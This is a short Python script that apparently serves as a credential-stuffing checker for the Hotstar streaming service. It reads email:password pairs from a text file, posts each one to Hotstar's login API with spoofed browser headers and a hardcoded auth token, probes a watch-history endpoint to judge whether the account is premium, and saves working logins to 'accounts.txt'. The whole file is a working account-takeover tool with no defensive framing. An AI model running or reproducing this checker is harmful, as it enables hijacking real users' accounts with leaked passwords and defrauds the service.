import requests
import json
import random
fh=open('hotstar.txt', 'r')
proxy = ""
line = fh.readline()


def isVip(email, payload, headers):
    url='https://persona.hotstar.com/v1/users/'+email+'/preferences/continue-watching?size=20'
    r = requests.get(url)
    print('Oh so this returned: '+str(r.status_code))
    if (r.status_code == 200):
        print("You can go till videos.. lets check a vip further")
        return True
    return False


for line in fh:
    if not line.strip():
        break
    else:
        email,password = line.split(":")
        password = password.strip()
        email = email.strip()
        url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
        payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
        headers = {
        'content-type': 'application/json',
        'Referer': 'https://www.hotstar.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
        'Accept': '*/*',
        'hotstarauth': 'st=1542433344~exp=1542439344~acl=/*~hmac=7dd9deaf6fb16859bd90b1cc84b0d39e0c07b6bb2e174ffecd9cb070a25d9418',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
        }
        print(email+":"+password)
        r = requests.post(url, data=json.dumps(payload), headers=headers)
        if (r.status_code==200):
            print ("Login Successful.. , Lets check if you can see VIP videos")
            if (isVip(email,payload,headers)):
                f = open("accounts.txt", "a")
                f.write(email + "," + password + "\n")
                f.close()
        else:
            print ("Login Failed ")
        line = fh.readline()
fh.close()
